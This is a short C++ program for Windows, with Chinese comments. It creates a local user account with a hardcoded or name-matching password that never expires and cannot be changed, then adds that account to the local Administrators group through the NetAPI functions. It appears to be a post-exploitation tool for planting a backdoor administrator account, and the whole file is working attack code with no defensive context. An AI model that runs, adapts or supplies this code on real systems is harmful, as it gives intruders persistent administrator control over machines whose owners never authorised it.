#include <iostream>
#include <windows.h>
#include <lm.h>

#pragma comment(lib,"Netapi32.lib");
using namespace std;

#ifndef UNICODE
#define UNICODE
#endif


int wmain(int argc, wchar_t **argv)
{
	NET_API_STATUS		nStatus;
	DWORD dwError		= 0;
	DWORD dwLevel		= 1;
	USER_INFO_1			ui;
	//ui.usri1_name		= L"test";   //用户名
	//ui.usri1_password	= L"password123!@#";   //密码
	//ui.usri1_name		= argv[1];
	//ui.usri1_password	= argv[1];
	ui.usri1_priv		= USER_PRIV_USER;  //权限
	ui.usri1_home_dir	= NULL;
	ui.usri1_comment	= NULL;
	ui.usri1_flags		= UF_SCRIPT|UF_DONT_EXPIRE_PASSWD|UF_PASSWD_CANT_CHANGE; //登录脚本执行，密码不可更改，密码永不过期
	ui.usri1_script_path = NULL;

	if (argc == 1)
	{
		ui.usri1_name = L"test";
		ui.usri1_password	= L"password123!@#";
	}
	else
	{
		ui.usri1_name = argv[1];
		ui.usri1_password = argv[1];
	}

	nStatus = NetUserAdd(
					NULL,
					dwLevel,
					(LPBYTE)&ui,
					&dwError
					);

	if ( nStatus == NERR_Success || nStatus == NERR_UserExists )
	{
		std::cout << "add user success" << std::endl;
	}
	else
	{
		std::cout << "add user failed: " << nStatus << std::endl;
		return 0;
	}


	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=ui.usri1_name; //传入用户名
	
	nStatus = NetLocalGroupAddMembers(
								NULL,
								L"Administrators",
								3,
								(LPBYTE)&account,
								1);

	if ( nStatus == NERR_Success )
	{
		std::cout << "add localgroup success" << std::endl;
	}
	else
	{
		std::cout << "add localgroup failed: " << nStatus << std::endl;
		return 0;
	}
	return 0;
}